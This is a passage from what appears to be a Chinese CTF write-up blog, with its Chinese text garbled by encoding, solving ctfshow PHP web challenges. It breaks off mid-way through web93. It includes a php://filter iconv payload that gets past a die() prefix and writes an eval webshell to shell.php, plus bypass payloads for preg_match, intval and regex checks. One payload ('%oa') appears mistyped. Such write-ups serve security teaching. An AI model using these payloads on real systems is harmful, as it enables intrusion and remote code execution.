</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#39;</span><span class="p">,</span><span class="nv">$x</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;too young too simple sometimes naive!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="nx">filter</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s2">&#34;&lt;?php die();?&gt;&#34;</span><span class="o">.</span><span class="nv">$contents</span><span class="p">);</span>
</span></span></code></pre></div><p>è¿™é¢˜è¿‡æ»¤äº†ä¸€äº›phpçš„åè®®å’Œè½¬æ¢å™¨</p>
<p>ä½†æ˜¯æ²¡è¿‡æ»¤æ‰filterå’Œconvert</p>
<p>æˆ‘ä»¬å¯ä»¥è€ƒè™‘ç”¨filteræ­é…convert.iconv.*è¿‡æ»¤å™¨æ¥æ„é€ å‡ºpayload</p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/woshilnp/article/details/117266628">è¯¦è§£php://filterä»¥åŠæ­»äº¡ç»•è¿‡_filterç»•è¿‡è¿‡æ»¤-CSDNåšå®¢</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">                                                         <span class="cp">?&gt;</span><span class="err">&#39;);
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="err">echo $enc;
</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="err">?&gt;
</span></span></span></code></pre></div><p>é¦–å…ˆæˆ‘ä»¬å…ˆå°†ä¸€å¥è¯æœ¨é©¬ä»UCS-2BEè½¬æ¢æˆUCS-2LE</p>
<pre tabindex="0"><code>?&lt;hp pe@av(l_$EG[T]1;)&gt;?
</code></pre><p>æ¥ç€æ„é€ payloadå°†ä¸€å¥è¯æœ¨é©¬ä»UCS-2LEè½¬æ¢å›UCS-2BEï¼ŒåŒæ—¶ç ´åæ‰<?php die();?></p>
<p>æ•ˆæœå¦‚ä¸‹</p>
<p><img alt="image-20250108125928677" loading="lazy" src="assets/image-20250108125928677.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php
contents=?&lt;hp pe@av(l_$EG[T]1;)&gt;?
</code></pre><p>æˆåŠŸå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ‹¿åˆ°flag</p>
<h3 id="phpç‰¹æ€§">phpç‰¹æ€§<a hidden class="anchor" aria-hidden="true" href="#phpç‰¹æ€§">#</a></h3>
<blockquote>
<p>å‚è€ƒç½‘ç«™ï¼š</p>
<p><a href="https://blog.csdn.net/qq_62046696/article/details/125272550">phpä¸€äº›ç‰¹æ€§å‡½æ•°ï¼ˆctfshowï¼‰</a></p></blockquote>
<h4 id="web89">web89<a hidden class="anchor" aria-hidden="true" href="#web89">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">\# -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm">\# @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm">\# @Date:  2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm">\# @Last Modified by:  h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm">\# @Last Modified time: 2020-09-18 15:38:51
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">\# @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">\# @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[0-9]/&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è¦ç”¨åˆ°æ•°ç»„ç»•è¿‡çš„ç‰¹æ€§æ¥ç»•è¿‡preg_matchçš„åŒ¹é…</p>
<h5 id="preg_matchå‡½æ•°">preg_matchå‡½æ•°ï¼š<a hidden class="anchor" aria-hidden="true" href="#preg_matchå‡½æ•°">#</a></h5>
<blockquote>
<p>preg_matchå‡½æ•°æ˜¯ç”¨äºå®Œæˆå­—ç¬¦ä¸²çš„æ­£åˆ™åŒ¹é…çš„å‡½æ•°ï¼Œå¦‚æœæ‰¾åˆ°ä¸€ä¸ªåŒ¹é…çš„ï¼Œå°±è¿”å›1ï¼Œå¦åˆ™å°±è¿”å›0ã€‚
preg_matchåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå¦‚æœä¼ å…¥çš„å€¼æ˜¯æ•°ç»„çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ï¼Œä»è€Œè¿”å›falseï¼Œç»•è¿‡äº†æ­£åˆ™åŒ¹é…ã€‚</p></blockquote>
<h5 id="intvalå‡½æ•°">intvalå‡½æ•°:<a hidden class="anchor" aria-hidden="true" href="#intvalå‡½æ•°">#</a></h5>
<blockquote>
<ul>
<li>
<p>å®šä¹‰:intval()<code>å‡½æ•°æ˜¯ PHP ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ã€‚å®ƒç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚å…¶åŸºæœ¬è¯­æ³•æ˜¯</code>intval($var, $base = 10)<code>ã€‚å…¶ä¸­</code>$var<code>æ˜¯è¦è½¬æ¢çš„å˜é‡ï¼Œ</code>$base<code>æ˜¯å¯é€‰å‚æ•°ï¼Œç”¨äºæŒ‡å®šè¿›åˆ¶ï¼ˆå½“</code>$var`æ˜¯å­—ç¬¦ä¸²æ—¶ï¼‰ï¼Œé»˜è®¤æ˜¯åè¿›åˆ¶ã€‚</p>
</li>
<li>
<p>ç‰¹æ€§ï¼š</p>
<p>1.å¦‚æœå˜é‡æœ¬èº«æ˜¯æ•´æ•°ï¼Œ<code>intval()</code>å‡½æ•°ä¼šè¿”å›å˜é‡æœ¬èº«çš„å€¼ã€‚</p>
<p>2.å½“å˜é‡æ˜¯å­—ç¬¦ä¸²æ—¶ï¼Œ<code>intval()</code>ä¼šå°è¯•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ã€‚å®ƒä¼šä»å­—ç¬¦ä¸²çš„å¼€å¤´æå–æ•°å­—éƒ¨åˆ†ï¼Œç›´åˆ°é‡åˆ°éæ•°å­—å­—ç¬¦ä¸ºæ­¢ã€‚</p>
<p>3.å¦‚æœå­—ç¬¦ä¸²ä»¥éæ•°å­—å­—ç¬¦å¼€å¤´ï¼Œ<code>intval()</code>ä¼šè¿”å› 0ã€‚</p>
<p>4.å½“ç¬¬äºŒä¸ªå‚æ•°<code>$base</code>è¢«æŒ‡å®šæ—¶ï¼Œ<code>intval()</code>å¯ä»¥å°†å­—ç¬¦ä¸²æŒ‰ç…§æŒ‡å®šçš„è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶æ•´æ•°ã€‚</p>
</li>
<li>
<p>æ³¨æ„äº‹é¡¹</p>
<p>1.å¯¹äºæµ®ç‚¹æ•°ï¼Œ<code>intval()</code>ä¼šç›´æ¥æˆªæ–­å°æ•°éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯è¿›è¡Œå››èˆäº”å…¥ã€‚</p>
<p>2.å½“å¤„ç†è¶…å‡ºæ•´æ•°èŒƒå›´çš„å€¼æ—¶ï¼ˆåœ¨ PHP ä¸­ï¼Œæ ¹æ®å¹³å°å’Œé…ç½®ä¸åŒï¼Œæ•´æ•°èŒƒå›´æœ‰æ‰€ä¸åŒï¼‰ï¼Œå¯èƒ½ä¼šå‡ºç°æ„å¤–çš„ç»“æœã€‚ä¾‹å¦‚ï¼Œåœ¨ 32 ä½ç³»ç»Ÿä¸Šï¼Œ<code>int</code>ç±»å‹çš„æœ€å¤§å€¼æ˜¯<code>2147483647</code>ï¼Œå¦‚æœ<code>intval()</code>å¤„ç†çš„å€¼è¶…è¿‡è¿™ä¸ªèŒƒå›´ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±æˆ–è€…ä¸æ­£ç¡®çš„è½¬æ¢ã€‚</p>
</li>
</ul></blockquote>
<p>è¿™é“é¢˜ç›´æ¥ç”¨æ•°ç»„ç»•è¿‡</p>
<p>payload:</p>
<pre tabindex="0"><code>?num[]=1
</code></pre><h4 id="web90">web90<a hidden class="anchor" aria-hidden="true" href="#web90">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:06:11
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">===</span><span class="s2">&#34;4476&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">===</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è®¾ç½®<code>$base = 0</code>èƒ½æä¾›ä¸€ç§æ ¹æ®å­—ç¬¦ä¸²å†…å®¹è‡ªåŠ¨åˆ¤æ–­è¿›åˆ¶æ¥è¿›è¡Œè½¬æ¢çš„çµæ´»æ–¹å¼ã€‚</p>
<p>è¿™é“é¢˜å¯ä»¥åˆ©ç”¨intvalçš„ç‰¹æ€§å’Œphpå¼ºæ¯”è¾ƒçš„ç‰¹æ€§</p>
<blockquote>
<p>å½“å˜é‡æ˜¯å­—ç¬¦ä¸²æ—¶ï¼Œ<code>intval()</code>ä¼šå°è¯•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ã€‚å®ƒä¼šä»å­—ç¬¦ä¸²çš„å¼€å¤´æå–æ•°å­—éƒ¨åˆ†ï¼Œç›´åˆ°é‡åˆ°éæ•°å­—å­—ç¬¦ä¸ºæ­¢ã€‚</p></blockquote>
<p><img alt="image-20241130160847046" loading="lazy" src="assets/image-20241130160847046.png"></p>
<h4 id="web91">web91<a hidden class="anchor" aria-hidden="true" href="#web91">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:16:09
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^php$/im&#39;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^php$/i&#39;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;hacker&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;nonononono&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ç†è§£å’Œç»•è¿‡</p>
<p>è¿™ä¸¤ä¸ªæ­£åˆ™è¡¨è¾¾å¼éƒ½æ˜¯ç”¨æ¥åŒ¹é…å­—ç¬¦ä¸²phpçš„</p>
<blockquote>
<h5 id="phpim-çš„å«ä¹‰"><code>/^php$/im</code> çš„å«ä¹‰<a hidden class="anchor" aria-hidden="true" href="#phpim-çš„å«ä¹‰">#</a></h5>
<ul>
<li><code>^</code>ï¼šè¡¨ç¤ºå­—ç¬¦ä¸²çš„å¼€å§‹ã€‚</li>
<li><code>php</code>ï¼šè¡¨ç¤ºåŒ¹é…å­—ç¬¦ <code>php</code>ã€‚</li>
<li><code>$</code>ï¼šè¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“æŸã€‚</li>
<li><code>i</code>ï¼šè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ã€‚</li>
<li><code>m</code>ï¼šè¡¨ç¤ºå¤šè¡Œæ¨¡å¼ï¼ˆmulti-lineï¼‰ã€‚</li>
</ul></blockquote>
<p>è¦å¾—åˆ°flagï¼Œæˆ‘ä»¬éœ€è¦è®©ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¸ºtrueï¼Œç¬¬äºŒä¸ªåˆ¤æ–­ä¸ºfalse</p>
<p>è€Œç¬¬äºŒä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸æ­£åˆ™è¡¨è¾¾å¼ä¸€çš„åŒºåˆ«åœ¨äºä»–æ²¡æœ‰è¿›è¡Œå¤šè¡ŒåŒ¹é…</p>
<p>é‚£æˆ‘ä»¬åªéœ€è¦é€šè¿‡æ¢è¡Œç¬¦å°±å¯ä»¥å®ç°ç»•è¿‡</p>
<p>payload:</p>
<pre tabindex="0"><code>cmd=%oaphp
</code></pre><h4 id="web92">web92<a hidden class="anchor" aria-hidden="true" href="#web92">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:29:30
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="k">echo</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜ä¸90é¢˜çš„åŒºåˆ«å°±åœ¨äºè¿™é‡Œè¿›è¡Œçš„æ˜¯å¼±ç±»å‹çš„æ¯”è¾ƒ</p>
<p>åœ¨å¼±ç±»å‹çš„æ¯”è¾ƒé‡Œé¢æˆ‘ä»¬ä¸èƒ½é€šè¿‡å¢åŠ å­—æ¯çš„æ–¹å¼ç»•è¿‡ï¼Œå¦‚ä¸‹</p>
<pre tabindex="0"><code>&#34;123aa&#34; == 123
&#34;123aa&#34; === 123aa
</code></pre><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å…¶å®ƒæ–¹æ³•æ¥ç»•è¿‡</p>
<p>å¦‚é€šè¿‡intvalå‡½æ•°çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¾“å…¥è½¬æ¢æˆå…¶ä»–è¿›åˆ¶çš„4476æ¥è¿›è¡Œç»•è¿‡ï¼ˆå‰é¢è¯´è¿‡å½“base=0æ—¶ä¼šè‡ªåŠ¨è¿›è¡Œè¿›åˆ¶çš„è½¬æ¢ï¼‰ã€‚</p>
<p>payloadï¼š</p>
<pre tabindex="0"><code>HEX: 0x117c //åè¿›åˆ¶å‰é¢è¡¥0x
OCT: 010574 //å…«è¿›åˆ¶å‰é¢è¡¥0
</code></pre><p>æˆ–è€…</p>
<p>å®˜æ–¹é¢˜è§£</p>
<blockquote>
<p>intval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å–,ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡å‰é¢çš„==4476ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„é€  4476e123</p></blockquote>
<h4 id="web93">web93<a hidden class="anchor" aria-hidden="true" href="#web93">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-18 16:32:58
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[a-z]/i&#34;</span><span class="p">,</span> <span class="nv">$num</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;no no no!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$num</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="o">==</span><span class="mi">4476</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
